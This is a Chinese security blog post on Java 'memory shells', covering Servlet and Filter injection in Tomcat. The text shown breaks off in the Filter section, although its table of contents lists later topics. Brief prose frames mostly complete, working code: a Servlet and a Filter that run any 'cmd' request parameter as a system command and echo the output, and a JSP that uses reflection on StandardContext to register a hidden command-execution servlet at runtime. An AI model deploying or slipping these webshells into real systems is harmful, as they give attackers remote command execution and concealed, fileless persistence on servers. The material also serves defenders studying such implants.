<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content><title>Java 内存马</title><link rel=canonical href=https://example.com/p/java-%E5%86%85%E5%AD%98%E9%A9%AC/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="Java 内存马"><meta property='og:description' content><meta property='og:url' content='https://example.com/p/java-%E5%86%85%E5%AD%98%E9%A9%AC/'><meta property='og:site_name' content="B5juan's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='内存马'><meta property='article:published_time' content='2025-08-11T18:28:30+08:00'><meta property='article:modified_time' content='2025-08-11T18:28:30+08:00'><meta name=twitter:title content="Java 内存马"><meta name=twitter:description content><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/images/fish.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>B5juan's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu id=main-menu><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#0x01-web-api型>0x01 Web Api型</a><ol><li><a href=#11-servlet>1.1 Servlet</a><ol><li><a href=#1-java-servlet>1) Java Servlet</a></li><li><a href=#2-servlet-内存马>2) Servlet 内存马</a></li></ol></li><li><a href=#12-filter>1.2 Filter</a><ol><li><a href=#1-filter>1) Filter</a></li><li><a href=#2-filter-内存马>2) Filter 内存马</a></li></ol></li><li><a href=#13-listener>1.3 Listener</a><ol><li><a href=#1-listener>1) Listener</a></li><li><a href=#2-listener-内存马>2) Listener 内存马</a></li></ol></li><li><a href=#14-valve>1.4 Valve</a><ol><li><a href=#1-valve>1) Valve</a></li><li><a href=#2-valve-内存马>2) Valve 内存马</a></li></ol></li><li><a href=#15-spring-mvc>1.5 Spring MVC</a><ol><li><a href=#1-controller>1) Controller</a></li><li><a href=#2-interceptor>2) Interceptor</a></li></ol></li></ol></li><li><a href=#0x02-agent型>0x02 Agent型</a><ol><li><a href=#21-agent>2.1 Agent</a><ol><li><a href=#1-premain-agent示例>1) premain agent示例</a></li><li><a href=#2-agentmain-agent示例>2) agentmain agent示例</a></li></ol></li><li><a href=#22-注入agentmain内存马>2.2 注入agentmain内存马</a><ol><li><a href=#1-注入agent>1) 注入agent</a></li><li><a href=#2-修改字节码>2) 修改字节码</a></li></ol></li></ol></li><li><a href=#0x03-反序列化注入内存马>0x03 反序列化注入内存马</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/security/>Security
</a><a href=/categories/java/>Java</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/java-%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Aug 11, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>9 minute read</time></div></footer></div></header><section class=article-content><h2 id=0x01-web-api型>0x01 Web Api型</h2><h3 id=11-servlet>1.1 Servlet</h3><h4 id=1-java-servlet>1) Java Servlet</h4><p>Java Server Applet(Little Application)，Java 服务端小型程序。<code>Servlet</code> 是 Java Web 开发的基础组件，负责接收客户端的请求（<code>Request</code>），处理请求（例如访问数据库、执行业务逻辑），然后生成响应（<code>Response</code>）并发送回客户端。</p><h4 id=2-servlet-内存马>2) Servlet 内存马</h4><p>在目标服务端动态插入一个自定义的恶意 <code>Servlet</code>。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=nd>@WebServlet</span><span class=p>(</span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;ServletShell&#34;</span><span class=p>,</span><span class=w> </span><span class=n>urlPatterns</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;/ServletShell&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>ServletShell</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>HttpServlet</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w>    </span><span class=kd>protected</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>doGet</span><span class=p>(</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>req</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>resp</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>ServletException</span><span class=p>,</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w>        </span><span class=c1>// super.doGet(req, resp);</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w>        </span><span class=c1>// resp.getWriter().println(&#34;&lt;br&gt;&lt;h1&gt;Hello Servlet&lt;/h1&gt;&lt;br&gt;&#34;);</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;cmd&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmd</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>            </span><span class=n>resp</span><span class=p>.</span><span class=na>setContentType</span><span class=p>(</span><span class=s>&#34;text/html&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>            </span><span class=n>Process</span><span class=w> </span><span class=n>process</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>            </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>process</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>line</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>            </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>                </span><span class=n>resp</span><span class=p>.</span><span class=na>getWriter</span><span class=p>().</span><span class=na>println</span><span class=p>(</span><span class=n>line</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.core.ApplicationContext&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.core.StandardContext&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.connector.Request&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.Wrapper&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.lang.reflect.Constructor&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.InputStreamReader&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.BufferedReader&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.util.Map&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.lang.reflect.Field&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.Context&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.IOException&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=w>  
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w></span><span class=c1>// 获取 StandardContext 的方法一</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w></span><span class=c1>// ServletContext servletContext = request.getSession().getServletContext();</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w></span><span class=c1>// Field f1 = servletContext.getClass().getDeclaredField(&#34;context&#34;);</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w></span><span class=c1>// f1.setAccessible(true);</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w></span><span class=c1>// ApplicationContext applicationContext = (ApplicationContext) f1.get(servletContext);</span><span class=w>
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>20</span><span class=cl><span class=w></span><span class=c1>// Field f2 = applicationContext.getClass().getDeclaredField(&#34;context&#34;);</span><span class=w>
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=w></span><span class=c1>// f2.setAccessible(true);</span><span class=w>
</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=w></span><span class=c1>// StandardContext standardContext = (StandardContext) f2.get(applicationContext);</span><span class=w>
</span></span></span><span class=line><span class=ln>23</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>24</span><span class=cl><span class=w></span><span class=c1>// 获取 StandardContext 的方法二</span><span class=w>
</span></span></span><span class=line><span class=ln>25</span><span class=cl><span class=w></span><span class=n>Field</span><span class=w> </span><span class=n>f3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>request</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;request&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>26</span><span class=cl><span class=w></span><span class=n>f3</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>27</span><span class=cl><span class=w></span><span class=n>Request</span><span class=w> </span><span class=n>req</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Request</span><span class=p>)</span><span class=w> </span><span class=n>f3</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>request</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>28</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>29</span><span class=cl><span class=w></span><span class=n>StandardContext</span><span class=w> </span><span class=n>standardContext</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>StandardContext</span><span class=p>)</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=na>getContext</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>30</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>31</span><span class=cl><span class=w></span><span class=n>Servlet</span><span class=w> </span><span class=n>servlet</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HttpServlet</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>32</span><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln>33</span><span class=cl><span class=w>    </span><span class=kd>protected</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>doGet</span><span class=p>(</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>req</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>resp</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>ServletException</span><span class=p>,</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>34</span><span class=cl><span class=w>        </span><span class=c1>// super.doGet(req, resp);</span><span class=w>
</span></span></span><span class=line><span class=ln>35</span><span class=cl><span class=w>        </span><span class=c1>// resp.getWriter().println(&#34;&lt;br&gt;Hello Dynamic Servlet&lt;br&gt;&#34;);</span><span class=w>
</span></span></span><span class=line><span class=ln>36</span><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;cmd&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>37</span><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmd</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>38</span><span class=cl><span class=w>            </span><span class=n>resp</span><span class=p>.</span><span class=na>setContentType</span><span class=p>(</span><span class=s>&#34;text/html&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>39</span><span class=cl><span class=w>            </span><span class=n>Process</span><span class=w> </span><span class=n>process</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>40</span><span class=cl><span class=w>            </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>process</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=ln>41</span><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>line</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>42</span><span class=cl><span class=w>            </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=ln>43</span><span class=cl><span class=w>                </span><span class=n>resp</span><span class=p>.</span><span class=na>getWriter</span><span class=p>().</span><span class=na>println</span><span class=p>(</span><span class=n>line</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>44</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>45</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>46</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>47</span><span class=cl><span class=w></span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=ln>48</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>49</span><span class=cl><span class=w></span><span class=n>Wrapper</span><span class=w> </span><span class=n>wrapper</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>standardContext</span><span class=p>.</span><span class=na>createWrapper</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>50</span><span class=cl><span class=w></span><span class=n>wrapper</span><span class=p>.</span><span class=na>setName</span><span class=p>(</span><span class=s>&#34;DynamicServletShell&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>51</span><span class=cl><span class=w></span><span class=n>wrapper</span><span class=p>.</span><span class=na>setLoadOnStartup</span><span class=p>(</span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>52</span><span class=cl><span class=w></span><span class=n>wrapper</span><span class=p>.</span><span class=na>setServlet</span><span class=p>(</span><span class=n>servlet</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>53</span><span class=cl><span class=w></span><span class=n>wrapper</span><span class=p>.</span><span class=na>setServletClass</span><span class=p>(</span><span class=n>HttpServlet</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=ln>54</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>55</span><span class=cl><span class=w></span><span class=n>standardContext</span><span class=p>.</span><span class=na>addChild</span><span class=p>(</span><span class=n>wrapper</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>56</span><span class=cl><span class=w></span><span class=n>standardContext</span><span class=p>.</span><span class=na>addServletMappingDecoded</span><span class=p>(</span><span class=s>&#34;/DynamicServletShell&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;DynamicServletShell&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>57</span><span class=cl><span class=w></span><span class=o>%&gt;</span><span class=w>
</span></span></span></code></pre></div><h3 id=12-filter>1.2 Filter</h3><h4 id=1-filter>1) Filter</h4><p>Java Servlet Api 下的重要组件，用于拦截用户请求以及服务端的响应，能够在拦截之后对请求和响应做出相应的修改，可以用来实现诸如日志记录、权限检查、字符编码设置、数据压缩等功能。对客户端来说，<code>Filter</code> 相比 <code>Servlet</code>在更外层，比 <code>Servlet</code>先处理请求，后处理响应。</p><h4 id=2-filter-内存马>2) Filter 内存马</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=c1>//@WebFilter(filterName = &#34;FilterShell&#34;, urlPatterns = &#34;/*&#34;)</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>FilterShell</span><span class=w> </span><span class=kd>implements</span><span class=w> </span><span class=n>Filter</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>init</span><span class=p>(</span><span class=n>FilterConfig</span><span class=w> </span><span class=n>filterConfig</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>ServletException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w>       </span><span class=c1>// System.out.println(&#34;FilterShell init&#34;);</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>doFilter</span><span class=p>(</span><span class=n>ServletRequest</span><span class=w> </span><span class=n>servletRequest</span><span class=p>,</span><span class=w> </span><span class=n>ServletResponse</span><span class=w> </span><span class=n>servletResponse</span><span class=p>,</span><span class=w> </span><span class=n>FilterChain</span><span class=w> </span><span class=n>filterChain</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ServletException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>        </span><span class=n>servletResponse</span><span class=p>.</span><span class=na>getWriter</span><span class=p>().</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;&lt;br&gt;Hello Filter&lt;br&gt;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>servletRequest</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;cmd&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmd</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>            </span><span class=n>servletResponse</span><span class=p>.</span><span class=na>setContentType</span><span class=p>(</span><span class=s>&#34;text/html&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>            </span><span class=n>Process</span><span class=w> </span><span class=n>process</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>            </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>process</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>line</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>            </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w>                </span><span class=n>servletResponse</span><span class=p>.</span><span class=na>getWriter</span><span class=p>().</span><span class=na>println</span><span class=p>(</span><span class=n>line</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>20</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=w>        </span><span class=n>filterChain</span><span class=p>.</span><span class=na>doFilter</span><span class=p>(</span><span class=n>servletRequest</span><span class=p>,</span><span class=w> </span><span class=n>servletResponse</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>23</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>24</span><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln>25</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>destroy</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>26</span><span class=cl><span class=w>        </span><span class=n>Filter</span><span class=p>.</span><span class=na>super</span><span class=p>.</span><span class=na>destroy</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>27</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>28</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
